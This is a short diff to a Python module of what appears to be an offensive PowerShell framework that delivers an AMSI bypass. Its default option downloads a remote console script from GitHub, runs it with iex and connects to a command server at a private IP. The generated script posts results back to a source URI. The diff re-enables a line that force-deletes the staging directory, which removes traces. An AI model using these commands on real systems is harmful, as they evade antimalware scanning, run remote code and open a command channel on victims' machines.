@@ -85,7 +85,7 @@ class CustomModule(Module):
             "filePath": ["/home/kali/rm.ps1", "Path to the bypass file", True],
             "lineNumbers": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True],
             "instruction": ["(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/Telefonica/ibombshell/master/console').Content | iex; console -Silently -uriConsole http://192.168.56.5:8080", 
-            		"Instruction to execute after bypass AMSI", False]
+            		"Instruction to execute after AMSI bypass", False]
         }
 
         super(CustomModule, self).__init__(information, options)
@@ -201,7 +201,7 @@ class CustomModule(Module):
                     
             function += f"$result = loader -directory {destination}\n"
             function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n"
-            #function += f"Remove-Item -Path {destination} -Recurse -Force\n"
+            function += f"Remove-Item -Path {destination} -Recurse -Force\n"
 
             if self.args["instruction"]:
                 function += self.args["instruction"]
@@ -219,7 +219,6 @@ class CustomModule(Module):
         except Exception as e:
             print_error("An error ocurred: " + e)
         finally:
-
             if BYPASS_SENT_ERROR:
                 print_error('An error occurred while sending the script.')
 
